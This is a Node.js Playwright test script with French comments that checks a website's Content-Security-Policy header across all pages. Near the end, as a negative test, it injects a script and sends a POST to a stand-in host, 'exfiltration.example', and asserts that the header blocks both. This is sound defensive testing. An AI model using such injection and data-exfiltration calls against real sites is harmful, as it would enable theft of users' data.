// En-tête Content-Security-Policy (ADR 0031) dans Chromium : chaque page HTML du site est servie avec l'en-tête lu
// dans site/.htaccess (le serveur de test python ne lit pas .htaccess) ; aucune violation ne doit être signalée au
// chargement. Vérifie aussi qu'un script injecté et un envoi vers un site inconnu sont refusés, et que l'en-tête est
// à jour (empreintes des scripts en ligne).
// Usage : (cd site && python3 -m http.server 8765) & node tools/test-csp.mjs
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join, relative } from 'node:path';
import { fileURLToPath } from 'node:url';
import { header } from './build-csp.mjs';
const pw = await import(process.env.PLAYWRIGHT || 'playwright');
const { chromium } = pw.default || pw;

const BASE = process.env.BASE || 'http://localhost:8765';
const SITE = fileURLToPath(new URL('../site/', import.meta.url));
let n = 0, bad = 0;
const ok = (cond, label) => { n++; if (!cond) { bad++; console.log('ÉCHEC ' + label); } };

const ht = readFileSync(join(SITE, '.htaccess'), 'utf8');
const csp = (/Header always set Content-Security-Policy "([^"]+)"/.exec(ht) || [])[1];
ok(!!csp, 'en-tête CSP présent dans site/.htaccess');
ok(csp === header().value, 'en-tête à jour (empreintes des scripts en ligne) — sinon : node tools/build-csp.mjs');
ok(/frame-ancestors 'none'/.test(csp) && /object-src 'none'/.test(csp) && !/script-src[^;]*'unsafe-inline'/.test(csp),
  'interdits : cadre, objets, script en ligne non répertorié');
ok(/X-Frame-Options "DENY"/.test(ht), 'X-Frame-Options pour les anciens navigateurs');

function pages(dir) {
  const out = [];
  for (const name of readdirSync(dir)) {
    const p = join(dir, name);
    if (statSync(p).isDirectory()) out.push(...pages(p));
    else if (name === 'index.html') out.push('/' + relative(SITE, p).replace(/index\.html$/, ''));
  }
  return out.sort();
}

const browser = await chromium.launch();
const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
// Chaque page du site reçoit l'en-tête ; les fonctions Edge et le reste sont simulés ou coupés.
await ctx.route(/.*/, async (route) => {
  const url = route.request().url();
  if (url.startsWith(BASE)) {
    const r = await route.fetch();
    const headers = { ...r.headers() };
    if ((headers['content-type'] || '').includes('text/html')) headers['content-security-policy'] = csp;
    return route.fulfill({ response: r, headers });
  }
  // QR code de connexion WeChat (/depot/) : seule image externe autorisée.
  if (url.includes('/functions/v1/depot/qr') && !url.includes('/poll')) {
    return route.fulfill({ status: 200, contentType: 'application/json', headers: { 'Access-Control-Allow-Origin': '*' },
      body: JSON.stringify({ scene: 'dl_test', expires_in: 600, image: 'https://mp.weixin.qq.com/cgi-bin/showqrcode?ticket=test' }) });
  }
  if (url.startsWith('https://mp.weixin.qq.com/')) {
    return route.fulfill({ status: 200, contentType: 'image/gif', body: Buffer.from('R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==', 'base64') });
  }
  if (url.startsWith('https://tuhbzziqyisdnqzfvtkh.supabase.co/')) {
    return route.fulfill({ status: 404, contentType: 'application/json', headers: { 'Access-Control-Allow-Origin': '*' }, body: '{"error":"not_found"}' });
  }
  return route.abort();
});
await ctx.addInitScript(() => {
  window.__csp = [];
  document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(e.violatedDirective + ' ' + (e.blockedURI || 'inline')));
});

const list = pages(SITE);
ok(list.length >= 15, 'pages trouvées : ' + list.length);
for (const path of list) {
  const page = await ctx.newPage();
  const errors = [];
  page.on('console', (m) => { if (m.type() === 'error' && /Content Security Policy/i.test(m.text())) errors.push(m.text().slice(0, 160)); });
  await page.goto(BASE + path, { waitUntil: 'load' });
  await page.waitForTimeout(300);
  const v = await page.evaluate(() => window.__csp);
  ok(v.length === 0 && errors.length === 0, `${path} : aucune violation ${v.concat(errors).join(' | ')}`);
  await page.close();
}

// /depot/ : QR code WeChat affiché sans violation.
{
  const p = await ctx.newPage();
  await p.goto(BASE + '/depot/');
  await p.waitForSelector('#qr:not([hidden])', { timeout: 5000 }).catch(() => {});
  const v = await p.evaluate(() => ({ src: document.getElementById('qr')?.src || '', list: window.__csp }));
  ok(v.src.startsWith('https://mp.weixin.qq.com/') && v.list.length === 0, '/depot/ : QR code WeChat autorisé ' + v.list.join(' | '));
  await p.close();
}

// Ce que l'en-tête doit refuser.
const page = await ctx.newPage();
await page.goto(BASE + '/offres/');
await page.evaluate(() => {
  const s = document.createElement('script'); s.textContent = 'window.__pwned = 1'; document.body.appendChild(s);
  return fetch('https://exfiltration.example/collect', { method: 'POST', body: 'x' }).catch(() => null);
});
await page.waitForTimeout(300);
const v = await page.evaluate(() => ({ pwned: window.__pwned, list: window.__csp }));
ok(v.pwned === undefined && v.list.some((x) => x.startsWith('script-src')), 'script injecté dans la page : refusé');
ok(v.list.some((x) => x.startsWith('connect-src') && x.includes('exfiltration.example')), 'envoi vers un site inconnu : refusé');
await page.close();

await browser.close();
console.log(`${n - bad}/${n} vérifications réussies`);
process.exit(bad ? 1 : 0);
